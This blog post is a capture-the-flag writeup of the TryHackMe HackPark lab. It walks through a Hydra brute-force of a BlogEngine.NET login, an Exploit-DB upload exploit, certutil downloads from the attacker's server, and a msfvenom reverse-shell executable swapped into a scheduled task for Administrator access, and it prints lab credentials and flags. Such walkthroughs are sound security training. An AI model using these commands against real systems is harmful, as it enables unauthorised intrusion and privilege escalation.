---
layout: post
title: HackPark - TryHackMe Writeup
subtitle: A Step-by-Step Guide to Rooting the HackPark Machine
description: Learn how to brute-force a website login, exploit a public vulnerability, and escalate privileges on a Windows machine in this TryHackMe HackPark writeup.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png
category: tryhackme
tags:
  - TryHackMe
  - Metasploit
  - Windows Privilege Escalation
  - Web Exploitation
author: Mustafa Altayeb
date: 2025-08-18
paginate: true
---

# HackPark - TryHackMe Writeup

[HackPark](https://tryhackme.com/room/hackpark) is a TryHackMe room where you'll brute-force a website login with Hydra, identify and use a public exploit, and escalate privileges on a Windows machine to gain Administrator access.

---

## Objectives
1. Gain initial access to the Windows machine.
2. Enumerate privilege escalation vectors using WinPEAS.
3. Exploit a Windows misconfiguration to achieve Administrator privileges.

---

## Reconnaissance

### Nmap Scan
Start by scanning the target machine to identify open ports and services:

```bash
nmap -Pn -T5 -sCV 10.10.19.138
```

**Note**: The machine does not respond to ICMP pings.

**Results**:
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 6 disallowed entries 
| /Account/search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-title: HackPark | HackPark Amusements
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-17T11:09:07+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2025-08-16T10:54:28
|_Not valid after:  2026-02-15T10:54:28
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-08-17T11:09:01+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

**Key Findings**:
- **Port 80**: Running Microsoft HTTPAPI httpd 2.0 (Microsoft IIS/8.5).
- **Port 3389**: Running Microsoft Terminal Services (RDP).

### Web Enumeration
Navigating to the web server on port 80 reveals a website with a login page:

![Pennywise Image](/assets/TryHackMeRoomsImage/HackPark/1.png)

The login form is accessible at:

![Login Page](/assets/TryHackMeRoomsImage/HackPark/2.png)

![Login Form](/assets/TryHackMeRoomsImage/HackPark/3.png)

---

## Brute-Force Login
To gain access, use Hydra to brute-force the login form. First, intercept the login request with Burp Suite to understand the POST parameters:

![Burp Suite Capture](/assets/TryHackMeRoomsImage/HackPark/4.png)

The form uses a POST request to submit credentials. Run Hydra with the following command:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.70.199 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=...&txtUser=^USER^&txtPass=^PASS^&btnLogin=Login:Login Failed"
```

**Result**:
```
[80][http-post-form] host: 10.10.70.199   login: admin   password: 1qaz2wsx
```

---

## Initial Access
Log in to the admin dashboard using the credentials `admin:1qaz2wsx`:

![Admin Dashboard](/assets/TryHackMeRoomsImage/HackPark/5.png)

Navigate to the "About" section to gather more information:

![About Section](/assets/TryHackMeRoomsImage/HackPark/6.png)

**Key Finding**:
```
BlogEngine.NET Specification
Version: 3.3.6.0
Configuration: Single blog
Trust level: Unrestricted
Identity: IIS APPPOOL\Blog
Blog provider: XmlBlogProvider
Membership provider: XmlMembershipProvider
Role provider: XmlRoleProvider
```

Search for exploits for BlogEngine.NET 3.3.6.0 on [Exploit-DB](https://www.exploit-db.com/exploits/46353):

![Exploit-DB](/assets/TryHackMeRoomsImage/HackPark/8.png)

### Exploitation
1. Upload the malicious `PostView.ascx` file (from the exploit) via the admin dashboard at:
   ```
   http://10.10.70.199/admin/app/editor/editpost
   ```

   ![Upload Exploit](/assets/TryHackMeRoomsImage/HackPark/9.png)

2. Trigger the vulnerability by accessing the following URL with a theme override:
   ```
   http://10.10.70.199/?theme=../../App_Data/files
   ```

This grants a reverse shell:

![Reverse Shell](/assets/TryHackMeRoomsImage/HackPark/7.png)

---

## Privilege Escalation

### System Enumeration
Run `systeminfo` to gather system details:

```
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
System Type:               x64-based PC
...
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           ...
```

**Key Finding**: The system is a 64-bit Windows Server 2012 R2.

Download `winPEASx64.exe` from [GitHub](https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe) to enumerate privilege escalation vectors.

1. Host a web server on your attacking machine:
   ```bash
   python3 -m http.server 3000
   ```

2. On the victim machine, download `winPEASx64.exe` using `certutil`:
   ```cmd
   certutil.exe -urlcache -f http://10.11.145.45:3000/winPEASx64.exe winPEASx64.exe
   ```

   ```
   ****  Online  ****
   CertUtil: -URLCache command completed successfully.
   ```

3. Run WinPEAS:
   ```cmd
   .\winPEASx64.exe
   ```

**Key Finding**:
WinPEAS reveals AutoLogon credentials:
```
Some AutoLogon credentials were found
DefaultUserName: administrator
DefaultPassword: 4q6XvFES7Fdxs
```

Additionally, it identifies a vulnerable scheduled task:
```
WindowsScheduler (Splinterware Software Solutions - System Scheduler Service) [C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
File Permissions: Everyone [Allow: WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [Allow: WriteData/CreateFiles])
```

### Exploiting the Scheduled Task
Navigate to the `SystemScheduler` directory:
```cmd
cd C:\Program Files (x86)\SystemScheduler
dir
```

**Output**:
```
08/18/2025  11:55 AM    <DIR>          Events
08/18/2025  11:55 AM             7,168 Message.exe
...
```

Navigate to the `Events` directory and inspect the `20198415519.INI_LOG.txt` file:
```cmd
cd Events
more 20198415519.INI_LOG.txt
```

**Output**:
```
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
...
```

The log shows `Message.exe` runs every 26 minutes as Administrator.

### Creating a Reverse Shell
1. Generate a reverse shell payload to replace `Message.exe`:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.145.45 LPORT=8888 -f exe > Message.exe
   ```

2. Host the payload on your attacking machine:
   ```bash
   python3 -m http.server 8000
   ```

3. Download the payload to the victim machine:
   ```cmd
   certutil.exe -urlcache -f http://10.11.145.45:8000/Message.exe Message.exe
   ```

   ```
   ****  Online  ****
   CertUtil: -URLCache command completed successfully.
   ```

4. Set up a Netcat listener on your attacking machine:
   ```bash
   nc -nlvp 8888
   ```

5. Wait for the scheduled task to execute `Message.exe`. This triggers the reverse shell:

   ```
   listening on [any] 8888 ...
   connect to [10.11.145.45] from (UNKNOWN) [10.10.222.220] 49323
   Microsoft Windows [Version 6.3.9600]
   (c) 2013 Microsoft Corporation. All rights reserved.
   C:\PROGRA~2\SYSTEM~1>
   ```

### Retrieving Flags
1. **User Flag**:
   ```cmd
   C:\Users\jeff\Desktop>more user.txt
   759bd8af507517bcfaede78a21a73e39
   ```

2. **Root Flag**:
   ```cmd
   C:\Users\Administrator\Desktop>more root.txt
   7e13d97f05f7ceb9881a3eb3d78d3e72
   ```

---

## Conclusion
This writeup demonstrated how to:
- Brute-force a login with Hydra.
- Exploit a BlogEngine.NET vulnerability for initial access.
- Escalate privileges by exploiting a misconfigured scheduled task.

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>

Follow me for more writeups:
- [GitHub](https://github.com/T4T4R1S)
- [Twitter](https://twitter.com/T4T4R1S)
- [LinkedIn](https://linkedin.com/in/t4t4r1s)

---

```
